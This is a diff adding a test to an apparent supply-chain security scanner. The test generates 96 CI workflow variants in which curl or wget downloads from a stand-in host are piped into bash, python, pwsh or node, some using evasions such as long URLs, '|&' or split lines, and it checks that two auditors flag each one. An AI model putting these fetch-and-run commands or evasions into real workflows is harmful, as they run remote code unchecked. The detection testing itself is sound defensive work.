@@ -344,3 +344,25 @@ test('ROOT-8: AST remote pipeline beyond old 240-char budget cannot appear clean
   assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({size,result}));
  }
 });
+
+test('CONTRACT: structural and heuristic auditors agree on 96 generated download-pipe evasions',()=>{
+ const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
+ const filename='.github/workflows/ci.yml';
+ let cases=0;
+ for(const downloader of ['curl -fsSL','wget -qO-'])
+ for(const length of [3,241,1024])
+ for(const interpreter of ['bash','python','pwsh','node'])
+ for(const pipe of ['|','|&'])
+ for(const multiline of [false,true]){
+  const command=downloader+' https://example.invalid/'+('q'.repeat(length))+' '+pipe;
+  const shell=multiline?[command,interpreter]:[command+' '+interpreter];
+  const yaml=['on: push','jobs:','  audit:','    steps:','      - run: |',
+   ...shell.map(s=>'          '+s)].join('\n');
+  const structural=inspectWorkflow(yaml);
+  const heuristic=reviewWorkflows({sha:SHA,expected:[filename],sources:{[filename]:yaml}});
+  assert.ok(structural.findings.some(x=>x.rule==='REMOTE_SHELL_PIPELINE'&&x.severity==='HIGH'),JSON.stringify({downloader,length,interpreter,pipe,multiline,structural}));
+  assert.ok(heuristic.findings.some(x=>x.rule==='REMOTE_SHELL_PIPELINE'&&x.severity==='HIGH'),JSON.stringify({downloader,length,interpreter,pipe,multiline,heuristic}));
+  cases++;
+ }
+ assert.equal(cases,96);
+});
